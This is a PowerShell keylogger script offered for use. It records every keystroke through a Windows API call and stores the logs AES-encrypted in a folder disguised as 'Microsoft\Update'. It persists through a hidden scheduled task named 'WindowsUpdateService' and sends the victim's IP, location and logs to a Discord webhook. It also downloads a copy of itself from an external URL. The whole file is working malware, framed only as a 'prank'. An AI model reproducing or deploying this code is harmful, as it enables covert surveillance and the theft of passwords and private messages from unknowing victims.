####################################################################################################
# Title       : Keylogger
# Version     : 2.0
# Author      : I am TBJr
# Description : AES-encrypted keystroke logger with persistence and optional Discord exfil
####################################################################################################

# --- Configuration -----------------------------------------------------------
$webhookUrl  = 'REPLACE_ME'  # Discord webhook URL for periodic log upload (leave 'REPLACE_ME' to disable)
$flushSecs   = 30            # How often (seconds) to flush buffered keystrokes to disk
$uploadMins  = 60            # How often (minutes) to POST encrypted log to webhook
$prankId     = [System.Guid]::NewGuid().ToString('N').Substring(0,8).ToUpper()
$targetAlias = $env:COMPUTERNAME
# -----------------------------------------------------------------------------

$logDir  = "$env:APPDATA\Microsoft\Update"
$logFile = "$logDir\$(([guid]::NewGuid()).ToString('N')).dat"
$key     = [System.Text.Encoding]::UTF8.GetBytes('MyS3cr3tK3y12345')

New-Item -ItemType Directory -Path $logDir -Force | Out-Null

# P/Invoke for GetAsyncKeyState — required for real keystroke capture.
# IsKeyLocked only detects CapsLock/NumLock/ScrollLock and is useless here.
Add-Type @"
using System.Runtime.InteropServices;
public class WinAPI {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@

# Virtual-key to character map (printable + named keys)
$keyMap = @{}
for ($i = 48; $i -le 57;  $i++) { $keyMap[$i] = [char]$i }   # 0-9
for ($i = 65; $i -le 90;  $i++) { $keyMap[$i] = [char]$i }   # A-Z
$keyMap[8]   = '[BS]';    $keyMap[9]   = '[TAB]'; $keyMap[13]  = '[ENTER]'
$keyMap[27]  = '[ESC]';   $keyMap[32]  = ' ';     $keyMap[46]  = '[DEL]'
$keyMap[37]  = '[LEFT]';  $keyMap[38]  = '[UP]';  $keyMap[39]  = '[RIGHT]'; $keyMap[40] = '[DOWN]'
$keyMap[188] = ',';  $keyMap[190] = '.';  $keyMap[186] = ';';  $keyMap[222] = "'"
$keyMap[191] = '/';  $keyMap[189] = '-';  $keyMap[187] = '=';  $keyMap[219] = '['
$keyMap[221] = ']';  $keyMap[220] = '\';  $keyMap[192] = '`'

function Write-EncryptedChunk([string]$text) {
    if ([string]::IsNullOrEmpty($text)) { return }
    $iv = New-Object byte[] 16
    (New-Object System.Security.Cryptography.RNGCryptoServiceProvider).GetBytes($iv)
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $key; $aes.IV = $iv
    $enc    = $aes.CreateEncryptor()
    $bytes  = [System.Text.Encoding]::UTF8.GetBytes($text)
    $cipher = $enc.TransformFinalBlock($bytes, 0, $bytes.Length)
    $aes.Dispose()
    $entry    = $iv + $cipher
    $lenBytes = [System.BitConverter]::GetBytes([int32]$entry.Length)
    $fs = [System.IO.File]::Open($logFile, [System.IO.FileMode]::Append, [System.IO.FileAccess]::Write)
    try { $fs.Write($lenBytes, 0, 4); $fs.Write($entry, 0, $entry.Length) }
    finally { $fs.Close() }
}

function Send-SessionStart {
    if ($webhookUrl -eq 'REPLACE_ME') { return }
    try {
        $r = (Invoke-WebRequest 'https://ipwho.is/' -UseBasicParsing -TimeoutSec 5).Content | ConvertFrom-Json
        $startPayload = @{
            username = "KeylogBot"
            content  = "🎯 **Session started** | ID: ``$prankId``"
            embeds   = @(@{
                title  = "Keylogger Session"
                color  = 10181046
                fields = @(
                    @{ name = "Prank ID";  value = $prankId;                                           inline = $true  },
                    @{ name = "Target";    value = $targetAlias;                                       inline = $true  },
                    @{ name = "IP";        value = $r.ip;                                              inline = $true  },
                    @{ name = "Location";  value = "$($r.city), $($r.region), $($r.country)";         inline = $false },
                    @{ name = "ISP";       value = $r.connection.isp;                                 inline = $true  }
                )
                footer    = @{ text = "Keylogger v2.0 by TBJr" }
                timestamp = (Get-Date).ToString("o")
            })
        }
        Invoke-RestMethod -Uri $webhookUrl -Method Post `
            -Body (ConvertTo-Json $startPayload -Depth 10) `
            -ContentType 'application/json' -ErrorAction Stop
    } catch {}
}

function Send-Log {
    if ($webhookUrl -eq 'REPLACE_ME' -or -not (Test-Path $logFile)) { return }
    try {
        $bytes = [System.IO.File]::ReadAllBytes($logFile)
        $b64   = [Convert]::ToBase64String($bytes)
        $body  = @{ username = "KeylogBot"; content = "``$targetAlias`` log | ID: ``$prankId``:`n$b64" }
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (ConvertTo-Json $body) -ContentType 'application/json' -ErrorAction Stop
    } catch {}
}

# Persist BEFORE entering the infinite loop so the task is always registered
$taskScript = "$logDir\update.ps1"
if ($MyInvocation.MyCommand.Path) {
    Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $taskScript -Force -ErrorAction SilentlyContinue
} else {
    # Running via irm | iex — no source file on disk, download a fresh copy
    Invoke-WebRequest 'https://tbjr.github.io/Flipper-payloads/host/keylogger.ps1' `
        -OutFile $taskScript -UseBasicParsing -ErrorAction SilentlyContinue
}
schtasks /create /tn "WindowsUpdateService" `
    /tr "powershell -w h -NoP -NonI -Ep Bypass -File `"$taskScript`"" `
    /sc onlogon /f 2>$null | Out-Null

Send-SessionStart

$buffer    = [System.Text.StringBuilder]::new()
$prevDown  = @{}
$lastFlush  = [DateTime]::Now
$lastUpload = [DateTime]::Now

while ($true) {
    Start-Sleep -Milliseconds 50

    $shift = (([WinAPI]::GetAsyncKeyState(160) -band 0x8000) -or ([WinAPI]::GetAsyncKeyState(161) -band 0x8000))
    $caps  = [Console]::CapsLock

    foreach ($vk in $keyMap.Keys) {
        $isDown = (([WinAPI]::GetAsyncKeyState($vk)) -band 0x8000) -ne 0
        if ($isDown -and -not $prevDown[$vk]) {
            $ch = $keyMap[$vk].ToString()
            if ($ch.Length -eq 1) {
                $ch = if ($shift -xor $caps) { $ch.ToUpper() } else { $ch.ToLower() }
            }
            $null = $buffer.Append($ch)
        }
        $prevDown[$vk] = $isDown
    }

    $now = [DateTime]::Now
    if (($now - $lastFlush).TotalSeconds -ge $flushSecs -and $buffer.Length -gt 0) {
        Write-EncryptedChunk $buffer.ToString()
        $buffer.Clear() | Out-Null
        $lastFlush = $now
    }
    if (($now - $lastUpload).TotalMinutes -ge $uploadMins) {
        Send-Log
        $lastUpload = $now
    }
}
